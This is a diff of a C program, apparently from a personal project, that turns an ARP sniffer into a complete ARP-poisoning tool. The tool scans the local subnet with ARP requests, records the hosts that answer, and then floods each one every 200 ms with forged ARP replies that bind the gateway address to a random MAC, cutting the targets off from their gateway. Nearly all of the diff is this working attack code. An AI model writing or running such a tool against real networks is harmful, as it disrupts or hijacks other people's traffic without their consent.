@@ -13,172 +13,107 @@
 #include <linux/if_packet.h>
 #include <net/if.h>
 #include <unistd.h>
+#include <pthread.h>
+#include <sys/random.h>
 
-#include "arp.h"
-
-struct target {
-   u_char mac[ETHER_ADDR_LEN];
-   u_char ip[4];
-};
-
-void pcap_fatal(const char *failed_in, const char *errbuf) {
-   printf("Fatal Error in %s: %s\n", failed_in, errbuf);
-   exit(1);
-}
-
-void printTargets(struct target *targets, u_int len) {
-   int i, j;
-   struct target *target = targets;
-   printf("%u targets:\n", len);
-
-   for (i = 0; i < len; i++, target++) {
-      for (j = 0; j < sizeof(target->mac); j++)
-         printf("%x%c", (target->mac)[j], j == sizeof(target->mac)-1 ? ' ' : ':');
-      for (j = 0; j < sizeof(target->ip); j++)
-         printf("%u%c", (target->ip)[j], j == sizeof(target->ip)-1 ? '\n' : '.');
-   }
-}
-
-int addTarget(struct target **targets, u_int *len, u_char *newMac, u_int *newIp) {
-   int i = 0;
-   struct target *target = *targets;
-   for (i = 0; i < *len; i++, target++) {
-      if (memcmp(target->ip, newIp, 4) == 0)
-         return 0;
-   }
-   *targets = realloc(*targets, (*len + 1) * sizeof(struct target));
-   target = *targets + *len;
-   memcpy(target->mac, newMac, ETHER_ADDR_LEN);
-   memcpy(target->ip, newIp, 4);
-   *len = *len + 1;
-   return 1;
-}
-
-void targetGuard(struct target **targets, u_int *len, u_int *hostIp) {
-	struct pcap_pkthdr header;
-	const unsigned char *packet;
-	char errbuf[PCAP_ERRBUF_SIZE];
-	char *device;
-
-	pcap_t *pcap_handle;
-	int i;
-
-	device = pcap_lookupdev(errbuf);
-	if(device == NULL)
-		pcap_fatal("pcap_lookupdev", errbuf);
-
-	printf("Sniffing on device %s\n", device);
-
-	pcap_handle = pcap_open_live(device, 4096, 0, 100, errbuf);
-	if(pcap_handle == NULL)
-		pcap_fatal("pcap_open_live", errbuf);
-	
-	while (1) {
-		packet = pcap_next(pcap_handle, &header);
-      struct eth_hdr *eth = (struct eth_hdr*) packet;
-      struct arp_hdr *arp = (struct arp_hdr*) (eth + 1);
-
-      if (eth->ether_type != htons(ETH_P_ARP))
-         continue;
-
-      u_char *targetMac = arp->src_hw_addr;
-      u_int targetIp = *((u_int *) arp->src_proto_addr);
-
-      // printf("\nChecking ");
-      // printMac(targetMac);
-      // printf(" (");
-      // printIP(&targetIp);
-      // printf(")...\n");
-
-      if (memcmp(&targetIp, hostIp, 3) != 0) {
-         // printf("Not a valid IP from this network\n");
-         continue;
-      }
-      if (((u_char *) &targetIp)[3] == 1 || ((u_char *) &targetIp)[3] == ((u_char *) hostIp)[3]) {
-         // printf("This IP is either of the gateway or of the host itself\n");
-         continue;
-      }
-
-      int targetNew = addTarget(targets, len, targetMac, &targetIp);
-      if (targetNew == 1) {
-         printf("\nNew target found\n");
-         printTargets(*targets, *len);
-      } else {
-         // printf("This target is already known\n");
-      }
-
-      // print_arp_packet(packet);
-	}
-
-	pcap_close(pcap_handle);
-}
+#include "target-guard.h"
 
 int main(void) {
-   u_char *dev = "wlp0s26u1u6";
-   struct sockaddr addr={0};
-   unsigned char *injection = malloc(42);
+   int i;
+   char *dev = "wlp0s26u1u6";
    struct target *targets = malloc(0);
    u_int targetsLen = 0;
 
    printf("Using interface %s", dev);
 
    u_int hostIp = getIpOfInterface(dev);
-   printf("Host IP: "); printIP(&hostIp); printf("\n");
+   printf("Host IP: "); printIP((u_char *) &hostIp); printf("\n");
    u_char hostMac[ETHER_ADDR_LEN];
    getMacOfInterface(dev, hostMac);
    printf("Host Mac: "); printMac(hostMac); printf("\n");
 
-   targetGuard(&targets, &targetsLen, &hostIp);
+   struct target_guard_args args = {
+      .interface = dev,
+      .targets = &targets,
+      .len = &targetsLen,
+      .hostIp = &hostIp
+   };
+   pthread_t targetGuardTh;
+   if (pthread_create(&targetGuardTh, NULL, startTargetGuard, &args) != 0) {
+      fatal("in pthread_create()");
+   }
 
-
+   // Setting up target interface sockaddr
+   struct sockaddr addr = { 0 };
    strncpy(addr.sa_data, dev, sizeof(addr.sa_data));
 
-   write_arp_base(injection, 2);
-   
-   print_arp_packet(injection);
+   u_char *injection = malloc(sizeof(struct eth_hdr) + sizeof(struct arp_hdr)); // Injection ARP packet
+   struct eth_hdr *inEth = (struct eth_hdr*) injection;
+   struct arp_hdr *inArp = (struct arp_hdr*) (inEth + 1);
 
-   return 0;
+   write_arp_base(injection, ARP_REQUEST);
+   // Ethernet header setup
+   memcpy(inEth->ether_src_addr, hostMac, ETHER_ADDR_LEN);
+   memset(inEth->ether_dest_addr, 0xFF, ETHER_ADDR_LEN);
+   // Arp header setup
+   memcpy(inArp->src_hw_addr, hostMac, ETHER_ADDR_LEN);
+   memcpy(inArp->src_proto_addr, &hostIp, 4);
+   memset(inArp->target_hw_addr, 0, ETHER_ADDR_LEN);
+   memcpy(inArp->target_proto_addr, &hostIp, 4 - 1); // The last bit will be set accordingly in the send loop
+
+   // printf("Base ARP Request packet:\n");
+   // print_arp_packet(injection);
+
+   usleep(200000); // Waiting for the targetGuard to be ready
 
    int so = socket(AF_INET, SOCK_PACKET, htons(ETH_P_ARP));
    if (so == -1) {
       fatal("socket()");
    }
 
-   while(1) {
+   printf("Sending ARP Request to every potential IP on the network...\n");
+
+   for (i = 2; i < 0xFE; i++) {
+      if (i == ((u_char *) &hostIp)[3]) {
+         continue;
+      }
+
+      (inArp->target_proto_addr)[3] = i;
+
       int bytes = sendto(so, injection, 42, 0, &addr, sizeof(struct sockaddr_ll));
       if (bytes == -1)
-         fatal("send()");
+         fatal("sendto()");
 
-      printf("Sent %d bytes...\n", bytes);
-
-      usleep(10000);
+      // printf("Sent %d bytes...\n", bytes);
    }
 
+   // Flodding targets with misleading ARP Replies
+   int sendInterval = 200; // Packets are sent at this interval in ms
+   inArp->operation = htons(ARP_REPLY);
+   getrandom(inArp->src_hw_addr, ETHER_ADDR_LEN, 0);
+   memcpy(inArp->src_proto_addr, &hostIp, 4 - 1);
+   (inArp->src_proto_addr)[3] = 1; // Gateway IP
+
+   printf("Flooding the targets with misleading ARP packets...");
+
+   while (1) {
+      struct target *target = targets;
+
+      for (i = 0; i < targetsLen; i++, target++) {
+         memcpy(inEth->ether_dest_addr, target->mac, ETHER_ADDR_LEN);
+         memcpy(inArp->target_hw_addr, target->mac, ETHER_ADDR_LEN);
+         memcpy(inArp->target_proto_addr, target->ip, 4);
+
+      int bytes = sendto(so, injection, 42, 0, &addr, sizeof(struct sockaddr_ll));
+      if (bytes == -1)
+         fatal("sendto()");
+      }
+
+      usleep(sendInterval * 1000); // Sleep for x ms
+   } 
+
+   close(so);
+   pthread_join(targetGuardTh, NULL);
+
    return 0;
-
-	// struct pcap_pkthdr header;
-	// const unsigned char *packet;
-	// char errbuf[PCAP_ERRBUF_SIZE];
-	// char *device;
-
-	// pcap_t *pcap_handle;
-	// int i;
-
-	// device = pcap_lookupdev(errbuf);
-	// if(device == NULL)
-	// 	pcap_fatal("pcap_lookupdev", errbuf);
-
-	// printf("Sniffing on device %s\n", device);
-
-	// pcap_handle = pcap_open_live(device, 4096, 0, 100, errbuf);
-	// if(pcap_handle == NULL)
-	// 	pcap_fatal("pcap_open_live", errbuf);
-	
-	// for(i=0; ; i++) {
-	// 	packet = pcap_next(pcap_handle, &header);
-   //    print_arp_packet(packet, &header);
-	// }
-
-	// pcap_close(pcap_handle);
 }
-
